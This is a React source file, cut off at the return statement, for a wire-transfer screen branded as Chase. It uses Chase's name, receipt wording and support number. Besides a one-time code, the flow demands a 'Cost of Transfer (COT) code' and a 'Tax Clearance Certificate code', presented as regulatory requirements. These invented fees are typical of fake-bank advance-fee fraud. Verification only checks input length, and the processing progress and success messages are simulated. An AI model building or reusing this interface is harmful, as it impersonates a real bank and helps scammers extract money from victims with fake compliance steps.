"use client"

import { useState, useEffect } from "react"
import { Drawer, DrawerContent, DrawerHeader, DrawerTitle, DrawerFooter } from "@/components/ui/drawer"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useToast } from "@/hooks/use-toast"
import { useBanking } from "@/lib/banking-context"
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
import {
  ArrowLeft,
  CheckCircle2,
  Shield,
  AlertTriangle,
  Loader2,
  FileText,
  Send,
  Lock,
  RefreshCw,
  Globe,
  Building,
  DollarSign,
  Copy,
  Download,
} from "lucide-react"
import { Progress } from "@/components/ui/progress"
import { Textarea } from "@/components/ui/textarea"

interface WireDrawerProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onReceiptOpen?: (transactionId: string) => void
}

type VerificationStep = "form" | "review" | "otp" | "cot" | "tax" | "processing" | "complete"

export function WireDrawer({ open, onOpenChange, onReceiptOpen }: WireDrawerProps) {
  const [recipientName, setRecipientName] = useState("")
  const [recipientBank, setRecipientBank] = useState("")
  const [routingNumber, setRoutingNumber] = useState("")
  const [accountNumber, setAccountNumber] = useState("")
  const [swiftCode, setSwiftCode] = useState("")
  const [amount, setAmount] = useState("")
  const [wireType, setWireType] = useState("domestic")
  const [purpose, setPurpose] = useState("")
  const [memo, setMemo] = useState("")
  const { toast } = useToast()
  const { addTransaction, accounts, userProfile, addNotification, addActivity, updateTransaction } = useBanking()
  const [isLoading, setIsLoading] = useState(false)
  const [selectedAccount, setSelectedAccount] = useState(accounts[0]?.id || "")

  const [currentStep, setCurrentStep] = useState<VerificationStep>("form")
  const [otpCode, setOtpCode] = useState("")
  const [cotCode, setCotCode] = useState("")
  const [taxCode, setTaxCode] = useState("")
  const [otpError, setOtpError] = useState("")
  const [cotError, setCotError] = useState("")
  const [taxError, setTaxError] = useState("")
  const [otpResendTimer, setOtpResendTimer] = useState(0)
  const [processingProgress, setProcessingProgress] = useState(0)
  const [processingStatus, setProcessingStatus] = useState("")
  const [createdTransactionId, setCreatedTransactionId] = useState<string | null>(null)
  const [confirmationNumber, setConfirmationNumber] = useState("")

  // Reset form when drawer closes
  useEffect(() => {
    if (!open) {
      setTimeout(() => {
        resetForm()
      }, 300)
    }
  }, [open])

  // OTP resend timer
  useEffect(() => {
    if (otpResendTimer > 0) {
      const timer = setTimeout(() => setOtpResendTimer(otpResendTimer - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [otpResendTimer])

  // Processing animation with status updates
  useEffect(() => {
    if (currentStep === "processing") {
      const statuses = [
        "Initializing secure connection...",
        "Verifying account details...",
        "Processing wire transfer...",
        "Contacting recipient bank...",
        "Finalizing transaction...",
        "Transfer submitted successfully!",
      ]

      let statusIndex = 0
      const statusInterval = setInterval(() => {
        if (statusIndex < statuses.length) {
          setProcessingStatus(statuses[statusIndex])
          statusIndex++
        }
      }, 800)

      const progressInterval = setInterval(() => {
        setProcessingProgress((prev) => {
          if (prev >= 100) {
            clearInterval(progressInterval)
            return 100
          }
          return prev + 2
        })
      }, 100)

      // Complete after processing
      const timer = setTimeout(() => {
        completeTransaction()
      }, 5000)

      return () => {
        clearInterval(progressInterval)
        clearInterval(statusInterval)
        clearTimeout(timer)
      }
    }
  }, [currentStep])

  const resetForm = () => {
    setRecipientName("")
    setRecipientBank("")
    setRoutingNumber("")
    setAccountNumber("")
    setSwiftCode("")
    setAmount("")
    setWireType("domestic")
    setPurpose("")
    setMemo("")
    setCurrentStep("form")
    setOtpCode("")
    setCotCode("")
    setTaxCode("")
    setOtpError("")
    setCotError("")
    setTaxError("")
    setOtpResendTimer(0)
    setProcessingProgress(0)
    setProcessingStatus("")
    setCreatedTransactionId(null)
    setConfirmationNumber("")
    setIsLoading(false)
  }

  const getFee = () => (wireType === "domestic" ? 30 : 45)
  const getTransferAmount = () => Number.parseFloat(amount) || 0
  const getTotalAmount = () => getTransferAmount() + getFee()

  const validateForm = () => {
    if (!recipientName || !routingNumber || !accountNumber || !amount) {
      toast({
        title: "Missing Information",
        description: "Please fill in all required fields",
        variant: "destructive",
      })
      return false
    }

    const fromAccount = accounts.find((a) => a.id === selectedAccount)
    if (!fromAccount) return false

    if (getTotalAmount() > fromAccount.balance) {
      toast({
        title: "Insufficient Funds",
        description: `Your available balance is $${fromAccount.balance.toFixed(2)} (including $${getFee()} fee)`,
        variant: "destructive",
      })
      return false
    }

    if (wireType === "domestic" && routingNumber.length !== 9) {
      toast({
        title: "Invalid Routing Number",
        description: "Routing number must be exactly 9 digits",
        variant: "destructive",
      })
      return false
    }

    if (wireType === "international" && (!swiftCode || swiftCode.length < 8)) {
      toast({
        title: "Invalid SWIFT Code",
        description: "SWIFT/BIC code must be at least 8 characters",
        variant: "destructive",
      })
      return false
    }

    if (accountNumber.length < 8) {
      toast({
        title: "Invalid Account Number",
        description: "Account number must be at least 8 digits",
        variant: "destructive",
      })
      return false
    }

    if (getTransferAmount() <= 0) {
      toast({
        title: "Invalid Amount",
        description: "Please enter a valid transfer amount",
        variant: "destructive",
      })
      return false
    }

    return true
  }

  const handleProceedToReview = () => {
    if (validateForm()) {
      setCurrentStep("review")
    }
  }

  const handleProceedToOTP = () => {
    setCurrentStep("otp")
    setOtpResendTimer(60)
    // Simulate sending OTP
    toast({
      title: "Verification Code Sent",
      description: `A 6-digit OTP has been sent to ${userProfile.phone}`,
    })
  }

  const handleVerifyOTP = () => {
    setIsLoading(true)
    setOtpError("")

    setTimeout(() => {
      setIsLoading(false)
      if (otpCode.length !== 6) {
        setOtpError("Please enter a valid 6-digit OTP code")
        return
      }
      // OTP verified - move to COT step
      setOtpError("")
      setCurrentStep("cot")
      toast({
        title: "OTP Verified Successfully",
        description: "Please enter your Cost of Transfer (COT) code to continue",
      })
    }, 1500)
  }

  const handleVerifyCOT = () => {
    setIsLoading(true)
    setCotError("")

    setTimeout(() => {
      setIsLoading(false)
      if (cotCode.length < 6) {
        setCotError("Please enter a valid COT code (minimum 6 characters)")
        return
      }
      // COT verified - move to Tax Clearance step
      setCotError("")
      setCurrentStep("tax")
      toast({
        title: "COT Code Verified",
        description: "Please complete tax clearance verification to finalize the transfer",
      })
    }, 1500)
  }

  const handleVerifyTax = () => {
    setIsLoading(true)
    setTaxError("")

    setTimeout(() => {
      setIsLoading(false)
      if (taxCode.length < 8) {
        setTaxError("Please enter a valid Tax Clearance Certificate code (minimum 8 characters)")
        return
      }
      // Tax verified - proceed to processing
      setTaxError("")
      initiateWireTransfer()
    }, 1500)
  }

  const handleResendOTP = () => {
    setOtpResendTimer(60)
    setOtpCode("")
    toast({
      title: "New Code Sent",
      description: `A new verification code has been sent to ${userProfile.phone}`,
    })
  }

  const initiateWireTransfer = () => {
    const fromAccount = accounts.find((a) => a.id === selectedAccount)
    if (!fromAccount) return

    // Generate confirmation number
    const confNum = `WIRE${Date.now().toString().slice(-8)}${Math.random().toString(36).substring(2, 6).toUpperCase()}`
    setConfirmationNumber(confNum)

    // Create pending transaction
    const transaction = addTransaction({
      description: `Wire Transfer to ${recipientName}`,
      amount: getTotalAmount(),
      type: "debit",
      category: "Wire Transfer",
      status: "pending",
      recipientName: recipientName,
      accountFrom: fromAccount.name,
      accountId: fromAccount.id,
      fee: getFee(),
      reference: confNum,
      recipientBank: recipientBank || (wireType === "domestic" ? "Domestic Bank" : "International Bank"),
      recipientAccount: `****${accountNumber.slice(-4)}`,
      routingNumber: routingNumber,
    })

    setCreatedTransactionId(transaction.id)
    setCurrentStep("processing")
    setProcessingProgress(0)

    // Add activity
    addActivity({
      action: `Wire Transfer initiated: $${getTransferAmount().toFixed(2)} to ${recipientName}`,
      device: "Current Device",
      location: "New York, NY",
    })

    // Add notification
    addNotification({
      title: "Wire Transfer Initiated",
      message: `Your wire transfer of $${getTransferAmount().toFixed(2)} to ${recipientName} is being processed. Confirmation: ${confNum}`,
      type: "info",
      category: "Transactions",
    })
  }

  const completeTransaction = () => {
    setCurrentStep("complete")

    // Add completion notification
    addNotification({
      title: "Wire Transfer Pending",
      message: `Your wire transfer of $${getTransferAmount().toFixed(2)} to ${recipientName} has been submitted and is pending. Expected completion: 1-3 business days.`,
      type: "success",
      category: "Transactions",
    })

    // Add activity
    addActivity({
      action: `Wire Transfer submitted successfully: $${getTransferAmount().toFixed(2)} to ${recipientName}`,
      device: "Current Device",
      location: "New York, NY",
    })
  }

  const handleClose = () => {
    onOpenChange(false)
  }

  const handleViewReceipt = () => {
    if (createdTransactionId) {
      onReceiptOpen?.(createdTransactionId)
    }
    handleClose()
  }

  const copyConfirmation = () => {
    navigator.clipboard.writeText(confirmationNumber)
    toast({
      title: "Copied",
      description: "Confirmation number copied to clipboard",
    })
  }

  const downloadReceipt = () => {
    const receiptContent = `
CHASE WIRE TRANSFER RECEIPT
===========================
Confirmation Number: ${confirmationNumber}
Date: ${new Date().toLocaleString()}

FROM:
Account: ${accounts.find((a) => a.id === selectedAccount)?.name}
Account Number: ${accounts.find((a) => a.id === selectedAccount)?.accountNumber}

TO:
Recipient: ${recipientName}
Bank: ${recipientBank || (wireType === "domestic" ? "Domestic Bank" : "International Bank")}
Account: ****${accountNumber.slice(-4)}
${wireType === "domestic" ? `Routing: ${routingNumber}` : `SWIFT: ${swiftCode}`}

AMOUNT:
Transfer Amount: $${getTransferAmount().toFixed(2)}
Wire Fee: $${getFee().toFixed(2)}
Total: $${getTotalAmount().toFixed(2)}

Status: PENDING
Expected Completion: 1-3 Business Days

Purpose: ${purpose || "Not specified"}
${memo ? `Memo: ${memo}` : ""}

Thank you for using Chase.
    `.trim()

    const blob = new Blob([receiptContent], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `chase-wire-receipt-${confirmationNumber}.txt`
    a.click()
    URL.revokeObjectURL(url)

    toast({
      title: "Receipt Downloaded",
      description: "Your wire transfer receipt has been saved",
    })
  }

  const getStepProgress = () => {
    switch (currentStep) {
      case "form":
        return 0
      case "review":
        return 16
      case "otp":
        return 33
      case "cot":
        return 50
      case "tax":
        return 66
      case "processing":
        return 83
      case "complete":
        return 100
      default:
        return 0
    }
  }

  const renderStepIndicator = () => {
    const steps = [
      { key: "form", label: "Details", icon: FileText },
      { key: "review", label: "Review", icon: FileText },
      { key: "otp", label: "OTP", icon: Shield },
      { key: "cot", label: "COT", icon: Lock },
      { key: "tax", label: "Tax", icon: FileText },
      { key: "complete", label: "Done", icon: CheckCircle2 },
    ]

    const currentIndex = steps.findIndex(
      (s) => s.key === currentStep || (currentStep === "processing" && s.key === "complete"),
    )

    return (
      <div className="px-4 py-3 border-b bg-muted/30">
        <div className="flex justify-between items-center mb-2">
          {steps.map((step, index) => {
            const Icon = step.icon
            const isActive = step.key === currentStep || (currentStep === "processing" && step.key === "complete")
            const isComplete = index < currentIndex || currentStep === "complete"

            return (
              <div key={step.key} className="flex flex-col items-center">
                <div
                  className={`h-8 w-8 rounded-full flex items-center justify-center text-xs font-medium transition-colors ${
                    isComplete
                      ? "bg-green-500 text-white"
                      : isActive
                        ? "bg-[#0a4fa6] text-white"
                        : "bg-muted text-muted-foreground"
                  }`}
                >
                  {isComplete ? <CheckCircle2 className="h-4 w-4" /> : <Icon className="h-4 w-4" />}
                </div>
                <span
                  className={`text-[10px] mt-1 ${isActive || isComplete ? "text-foreground font-medium" : "text-muted-foreground"}`}
                >
                  {step.label}
                </span>
              </div>
            )
          })}
        </div>
        <Progress value={getStepProgress()} className="h-1" />
      </div>
    )
  }

  // Form Step
  const renderFormStep = () => (
    <div className="px-4 space-y-4 overflow-y-auto pb-4">
      <div className="bg-amber-50 dark:bg-amber-950/30 p-3 rounded-lg text-sm text-amber-800 dark:text-amber-200">
        <div className="flex items-start gap-2">
          <AlertTriangle className="h-4 w-4 mt-0.5 flex-shrink-0" />
          <span>
            Wire transfers require multi-step verification and cannot be reversed. Please verify all details carefully.
          </span>
        </div>
      </div>

      <div>
        <Label className="text-sm font-medium">From Account</Label>
        <Select value={selectedAccount} onValueChange={setSelectedAccount}>
          <SelectTrigger className="mt-1.5">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            {accounts
              .filter((a) => a.type === "checking" || a.type === "Checking")
              .map((account) => (
                <SelectItem key={account.id} value={account.id}>
                  {account.name} (${account.balance.toLocaleString()})
                </SelectItem>
              ))}
          </SelectContent>
        </Select>
      </div>

      <div>
        <Label className="text-sm font-medium">Wire Type</Label>
        <div className="grid grid-cols-2 gap-3 mt-1.5">
          <Button
            type="button"
            variant={wireType === "domestic" ? "default" : "outline"}
            onClick={() => setWireType("domestic")}
            className={`h-auto py-3 ${wireType === "domestic" ? "bg-[#0a4fa6] hover:bg-[#083d80]" : "bg-transparent"}`}
          >
            <Building className="h-4 w-4 mr-2" />
            <div className="text-left">
              <div className="font-medium">Domestic</div>
              <div className="text-xs opacity-80">$30 fee</div>
            </div>
          </Button>
          <Button
            type="button"
            variant={wireType === "international" ? "default" : "outline"}
            onClick={() => setWireType("international")}
            className={`h-auto py-3 ${wireType === "international" ? "bg-[#0a4fa6] hover:bg-[#083d80]" : "bg-transparent"}`}
          >
            <Globe className="h-4 w-4 mr-2" />
            <div className="text-left">
              <div className="font-medium">International</div>
              <div className="text-xs opacity-80">$45 fee</div>
            </div>
          </Button>
        </div>
      </div>

      <div className="space-y-3">
        <h3 className="font-semibold text-sm text-[#0a4fa6]">Recipient Information</h3>

        <div>
          <Label className="text-sm">Recipient Name *</Label>
          <Input
            placeholder="Full name as it appears on account"
            value={recipientName}
            onChange={(e) => setRecipientName(e.target.value)}
            className="mt-1.5"
          />
        </div>

        <div>
          <Label className="text-sm">Recipient Bank Name</Label>
          <Input
            placeholder="Bank name"
            value={recipientBank}
            onChange={(e) => setRecipientBank(e.target.value)}
            className="mt-1.5"
          />
        </div>

        {wireType === "domestic" ? (
          <div>
            <Label className="text-sm">Routing Number (ABA) *</Label>
            <Input
              placeholder="9-digit routing number"
              value={routingNumber}
              onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, "").slice(0, 9))}
              maxLength={9}
              className="mt-1.5"
            />
          </div>
        ) : (
          <div>
            <Label className="text-sm">SWIFT/BIC Code *</Label>
            <Input
              placeholder="8-11 character SWIFT code"
              value={swiftCode}
              onChange={(e) => setSwiftCode(e.target.value.toUpperCase().slice(0, 11))}
              maxLength={11}
              className="mt-1.5"
            />
          </div>
        )}

        <div>
          <Label className="text-sm">Account Number *</Label>
          <Input
            placeholder="Recipient account number"
            value={accountNumber}
            onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ""))}
            className="mt-1.5"
          />
        </div>
      </div>

      <div className="space-y-3">
        <h3 className="font-semibold text-sm text-[#0a4fa6]">Transfer Details</h3>

        <div>
          <Label className="text-sm">Amount (USD) *</Label>
          <div className="relative mt-1.5">
            <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              type="number"
              placeholder="0.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="pl-9"
            />
          </div>
        </div>

        <div>
          <Label className="text-sm">Purpose of Transfer</Label>
          <Select value={purpose} onValueChange={setPurpose}>
            <SelectTrigger className="mt-1.5">
              <SelectValue placeholder="Select purpose" />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="personal">Personal Transfer</SelectItem>
              <SelectItem value="business">Business Payment</SelectItem>
              <SelectItem value="investment">Investment</SelectItem>
              <SelectItem value="property">Real Estate</SelectItem>
              <SelectItem value="family">Family Support</SelectItem>
              <SelectItem value="other">Other</SelectItem>
            </SelectContent>
          </Select>
        </div>

        <div>
          <Label className="text-sm">Memo (Optional)</Label>
          <Textarea
            placeholder="Add a note for your records"
            value={memo}
            onChange={(e) => setMemo(e.target.value)}
            className="mt-1.5 resize-none"
            rows={2}
          />
        </div>
      </div>

      {amount && (
        <div className="bg-muted/50 p-4 rounded-lg space-y-2">
          <div className="flex justify-between text-sm">
            <span>Transfer Amount</span>
            <span>${getTransferAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}</span>
          </div>
          <div className="flex justify-between text-sm">
            <span>Wire Fee ({wireType === "domestic" ? "Domestic" : "International"})</span>
            <span>${getFee().toFixed(2)}</span>
          </div>
          <div className="flex justify-between font-semibold border-t pt-2">
            <span>Total</span>
            <span>${getTotalAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}</span>
          </div>
        </div>
      )}
    </div>
  )

  // Review Step
  const renderReviewStep = () => {
    const fromAccount = accounts.find((a) => a.id === selectedAccount)

    return (
      <div className="px-4 space-y-4 overflow-y-auto pb-4">
        <div className="bg-blue-50 dark:bg-blue-950/30 p-3 rounded-lg text-sm text-blue-800 dark:text-blue-200">
          <div className="flex items-start gap-2">
            <Shield className="h-4 w-4 mt-0.5 flex-shrink-0" />
            <span>Please review all details carefully. After verification, this transfer cannot be cancelled.</span>
          </div>
        </div>

        <div className="space-y-4">
          <div className="bg-card border rounded-lg p-4">
            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">From Account</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Account</span>
                <span className="font-medium">{fromAccount?.name}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Account Number</span>
                <span className="font-medium">{fromAccount?.accountNumber}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Available Balance</span>
                <span className="font-medium">${fromAccount?.balance.toLocaleString()}</span>
              </div>
            </div>
          </div>

          <div className="bg-card border rounded-lg p-4">
            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">Recipient Details</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Name</span>
                <span className="font-medium">{recipientName}</span>
              </div>
              {recipientBank && (
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Bank</span>
                  <span className="font-medium">{recipientBank}</span>
                </div>
              )}
              <div className="flex justify-between">
                <span className="text-muted-foreground">
                  {wireType === "domestic" ? "Routing Number" : "SWIFT Code"}
                </span>
                <span className="font-medium font-mono">{wireType === "domestic" ? routingNumber : swiftCode}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Account Number</span>
                <span className="font-medium font-mono">****{accountNumber.slice(-4)}</span>
              </div>
            </div>
          </div>

          <div className="bg-card border rounded-lg p-4">
            <h3 className="font-semibold text-sm text-[#0a4fa6] mb-3">Transfer Summary</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Wire Type</span>
                <span className="font-medium capitalize">{wireType}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Amount</span>
                <span className="font-medium">
                  ${getTransferAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Wire Fee</span>
                <span className="font-medium">${getFee().toFixed(2)}</span>
              </div>
              <div className="flex justify-between border-t pt-2 mt-2">
                <span className="font-semibold">Total Debit</span>
                <span className="font-bold text-[#0a4fa6]">
                  ${getTotalAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </span>
              </div>
              {purpose && (
                <div className="flex justify-between pt-2">
                  <span className="text-muted-foreground">Purpose</span>
                  <span className="font-medium capitalize">{purpose}</span>
                </div>
              )}
            </div>
          </div>

          <div className="bg-amber-50 dark:bg-amber-950/30 p-3 rounded-lg text-xs text-amber-800 dark:text-amber-200">
            <p className="font-medium mb-1">Processing Time</p>
            <p>{wireType === "domestic" ? "1-2 business days" : "2-5 business days"}</p>
          </div>
        </div>
      </div>
    )
  }

  // OTP Step
  const renderOTPStep = () => (
    <div className="px-4 space-y-6 overflow-y-auto pb-4">
      <div className="text-center">
        <div className="h-16 w-16 rounded-full bg-[#0a4fa6]/10 flex items-center justify-center mx-auto mb-4">
          <Shield className="h-8 w-8 text-[#0a4fa6]" />
        </div>
        <h3 className="font-semibold text-lg">Enter Verification Code</h3>
        <p className="text-sm text-muted-foreground mt-1">
          A 6-digit code has been sent to
          <br />
          <span className="font-medium text-foreground">{userProfile.phone}</span>
        </p>
      </div>

      <div className="flex flex-col items-center gap-4">
        <InputOTP
          maxLength={6}
          value={otpCode}
          onChange={(value) => {
            setOtpCode(value)
            setOtpError("")
          }}
          className="gap-2"
        >
          <InputOTPGroup>
            <InputOTPSlot index={0} className="h-12 w-12 text-lg" />
            <InputOTPSlot index={1} className="h-12 w-12 text-lg" />
            <InputOTPSlot index={2} className="h-12 w-12 text-lg" />
            <InputOTPSlot index={3} className="h-12 w-12 text-lg" />
            <InputOTPSlot index={4} className="h-12 w-12 text-lg" />
            <InputOTPSlot index={5} className="h-12 w-12 text-lg" />
          </InputOTPGroup>
        </InputOTP>

        {otpError && <p className="text-sm text-destructive text-center">{otpError}</p>}

        <div className="text-center">
          {otpResendTimer > 0 ? (
            <p className="text-sm text-muted-foreground">
              Resend code in <span className="font-medium text-foreground">{otpResendTimer}s</span>
            </p>
          ) : (
            <Button variant="ghost" size="sm" onClick={handleResendOTP} className="text-[#0a4fa6] hover:text-[#083d80]">
              <RefreshCw className="h-4 w-4 mr-2" />
              Resend Code
            </Button>
          )}
        </div>
      </div>

      <div className="bg-muted/50 p-3 rounded-lg text-xs text-muted-foreground">
        <p className="font-medium mb-1">Didn't receive the code?</p>
        <p>Check your phone for SMS. If you still don't receive it, contact customer support at 1-800-935-9935.</p>
      </div>
    </div>
  )

  // COT Step
  const renderCOTStep = () => (
    <div className="px-4 space-y-6 overflow-y-auto pb-4">
      <div className="text-center">
        <div className="h-16 w-16 rounded-full bg-[#0a4fa6]/10 flex items-center justify-center mx-auto mb-4">
          <Lock className="h-8 w-8 text-[#0a4fa6]" />
        </div>
        <h3 className="font-semibold text-lg">Cost of Transfer (COT) Code</h3>
        <p className="text-sm text-muted-foreground mt-1">Enter your COT code to verify this wire transfer</p>
      </div>

      <div className="space-y-4">
        <div>
          <Label>COT Code</Label>
          <Input
            type="text"
            placeholder="Enter your COT code"
            value={cotCode}
            onChange={(e) => {
              setCotCode(e.target.value.toUpperCase())
              setCotError("")
            }}
            className="mt-1.5 text-center font-mono text-lg tracking-wider"
          />
          {cotError && <p className="text-sm text-destructive mt-2">{cotError}</p>}
        </div>

        <div className="bg-blue-50 dark:bg-blue-950/30 p-4 rounded-lg text-sm">
          <h4 className="font-medium text-blue-900 dark:text-blue-100 mb-2">What is a COT Code?</h4>
          <p className="text-blue-800 dark:text-blue-200 text-xs">
            The Cost of Transfer (COT) code is a security verification code required for high-value wire transfers. This
            code ensures that the transfer is authorized and compliant with banking regulations.
          </p>
        </div>
      </div>
    </div>
  )

  // Tax Clearance Step
  const renderTaxStep = () => (
    <div className="px-4 space-y-6 overflow-y-auto pb-4">
      <div className="text-center">
        <div className="h-16 w-16 rounded-full bg-[#0a4fa6]/10 flex items-center justify-center mx-auto mb-4">
          <FileText className="h-8 w-8 text-[#0a4fa6]" />
        </div>
        <h3 className="font-semibold text-lg">Tax Clearance Verification</h3>
        <p className="text-sm text-muted-foreground mt-1">
          Enter your Tax Clearance Certificate code to complete verification
        </p>
      </div>

      <div className="space-y-4">
        <div>
          <Label>Tax Clearance Certificate Code</Label>
          <Input
            type="text"
            placeholder="Enter your tax clearance code"
            value={taxCode}
            onChange={(e) => {
              setTaxCode(e.target.value.toUpperCase())
              setTaxError("")
            }}
            className="mt-1.5 text-center font-mono text-lg tracking-wider"
          />
          {taxError && <p className="text-sm text-destructive mt-2">{taxError}</p>}
        </div>

        <div className="bg-amber-50 dark:bg-amber-950/30 p-4 rounded-lg text-sm">
          <h4 className="font-medium text-amber-900 dark:text-amber-100 mb-2">Tax Clearance Required</h4>
          <p className="text-amber-800 dark:text-amber-200 text-xs">
            For compliance with financial regulations, wire transfers require tax clearance verification. This ensures
            the funds are legally cleared for transfer and comply with anti-money laundering (AML) requirements.
          </p>
        </div>

        <div className="text-xs text-muted-foreground">
          <p>If you don't have a Tax Clearance Certificate code, please contact:</p>
          <p className="font-medium mt-1">Chase Support: 1-800-935-9935</p>
        </div>
      </div>
    </div>
  )

  // Processing Step
  const renderProcessingStep = () => (
    <div className="px-4 py-8 flex flex-col items-center justify-center min-h-[400px]">
      <div className="relative mb-6">
        <div className="h-20 w-20 rounded-full bg-[#0a4fa6]/10 flex items-center justify-center">
          <Loader2 className="h-10 w-10 text-[#0a4fa6] animate-spin" />
        </div>
      </div>

      <h3 className="font-semibold text-lg mb-2">Processing Wire Transfer</h3>
      <p className="text-sm text-muted-foreground text-center mb-6">{processingStatus}</p>

      <div className="w-full max-w-xs space-y-2">
        <Progress value={processingProgress} className="h-2" />
        <p className="text-xs text-center text-muted-foreground">{processingProgress}% Complete</p>
      </div>

      <div className="mt-8 text-center">
        <p className="text-xs text-muted-foreground">
          Please do not close this window
          <br />
          Your transfer is being securely processed
        </p>
      </div>
    </div>
  )

  // Complete Step
  const renderCompleteStep = () => (
    <div className="px-4 py-6 space-y-6 overflow-y-auto pb-4">
      <div className="text-center">
        <div className="h-20 w-20 rounded-full bg-green-100 dark:bg-green-900/30 flex items-center justify-center mx-auto mb-4">
          <CheckCircle2 className="h-10 w-10 text-green-600" />
        </div>
        <h3 className="font-semibold text-xl">Wire Transfer Submitted</h3>
        <p className="text-sm text-muted-foreground mt-1">Your transfer is being processed</p>
      </div>

      <div className="bg-card border rounded-lg p-4">
        <div className="flex items-center justify-between mb-3">
          <span className="text-sm text-muted-foreground">Confirmation Number</span>
          <Button variant="ghost" size="sm" onClick={copyConfirmation} className="h-8 px-2">
            <Copy className="h-4 w-4" />
          </Button>
        </div>
        <p className="font-mono text-lg font-bold text-[#0a4fa6] text-center">{confirmationNumber}</p>
      </div>

      <div className="bg-card border rounded-lg p-4 space-y-3">
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">Recipient</span>
          <span className="font-medium">{recipientName}</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">Amount</span>
          <span className="font-medium">
            ${getTransferAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}
          </span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">Fee</span>
          <span className="font-medium">${getFee().toFixed(2)}</span>
        </div>
        <div className="flex justify-between text-sm border-t pt-2">
          <span className="font-medium">Total</span>
          <span className="font-bold">${getTotalAmount().toLocaleString(undefined, { minimumFractionDigits: 2 })}</span>
        </div>
        <div className="flex justify-between text-sm pt-2">
          <span className="text-muted-foreground">Status</span>
          <span className="font-medium text-amber-600">Pending</span>
        </div>
        <div className="flex justify-between text-sm">
          <span className="text-muted-foreground">Expected Completion</span>
          <span className="font-medium">{wireType === "domestic" ? "1-2 business days" : "2-5 business days"}</span>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-3">
        <Button variant="outline" className="bg-transparent" onClick={downloadReceipt}>
          <Download className="h-4 w-4 mr-2" />
          Download
        </Button>
        <Button variant="outline" className="bg-transparent" onClick={handleViewReceipt}>
          <FileText className="h-4 w-4 mr-2" />
          View Receipt
        </Button>
      </div>

      <div className="bg-muted/50 p-3 rounded-lg text-xs text-muted-foreground text-center">
        <p>Save your confirmation number for your records.</p>
        <p className="mt-1">You can track your transfer in the Recent Activity section.</p>
      </div>
    </div>
  )

  const renderContent = () => {
    switch (currentStep) {
      case "form":
        return renderFormStep()
      case "review":
        return renderReviewStep()
      case "otp":
        return renderOTPStep()
      case "cot":
        return renderCOTStep()
      case "tax":
        return renderTaxStep()
      case "processing":
        return renderProcessingStep()
      case "complete":
        return renderCompleteStep()
      default:
        return null
    }
  }

  const renderFooter = () => {
    switch (currentStep) {
      case "form":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button onClick={handleProceedToReview} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
              Continue to Review
            </Button>
          </DrawerFooter>
        )
      case "review":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button onClick={handleProceedToOTP} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
              <Shield className="h-4 w-4 mr-2" />
              Continue to Verification
            </Button>
          </DrawerFooter>
        )
      case "otp":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button
              onClick={handleVerifyOTP}
              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
              disabled={isLoading || otpCode.length !== 6}
            >
              {isLoading ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Verify OTP"
              )}
            </Button>
          </DrawerFooter>
        )
      case "cot":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button
              onClick={handleVerifyCOT}
              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
              disabled={isLoading || cotCode.length < 6}
            >
              {isLoading ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Verify COT Code"
              )}
            </Button>
          </DrawerFooter>
        )
      case "tax":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button
              onClick={handleVerifyTax}
              className="w-full bg-[#0a4fa6] hover:bg-[#083d80]"
              disabled={isLoading || taxCode.length < 8}
            >
              {isLoading ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                <>
                  <Send className="h-4 w-4 mr-2" />
                  Complete Wire Transfer
                </>
              )}
            </Button>
          </DrawerFooter>
        )
      case "complete":
        return (
          <DrawerFooter className="border-t pt-4">
            <Button onClick={handleClose} className="w-full bg-[#0a4fa6] hover:bg-[#083d80]">
              Done
            </Button>
          </DrawerFooter>
        )
      default:
        return null
    }
  }

  return (
    <Drawer open={open} onOpenChange={onOpenChange}>
